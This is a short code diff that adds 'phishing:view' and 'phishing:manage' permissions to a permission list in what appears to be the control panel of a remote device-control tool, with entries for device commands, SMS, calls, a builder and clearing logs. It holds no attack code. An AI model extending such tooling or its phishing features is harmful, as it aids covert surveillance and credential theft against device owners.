@@ -40,6 +40,7 @@ export const ALL_PERMISSIONS: Permission[] = [
   'device:command', 'device:delete',
   'builder:access', 'logs:view', 'logs:clear', 'users:manage',
   'settings:view', 'settings:edit', 'stats:view', 'files:download',
+  'phishing:view', 'phishing:manage',
 ];
 export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'dashboard:view', 'device:view', 'device:sms', 'device:calls',
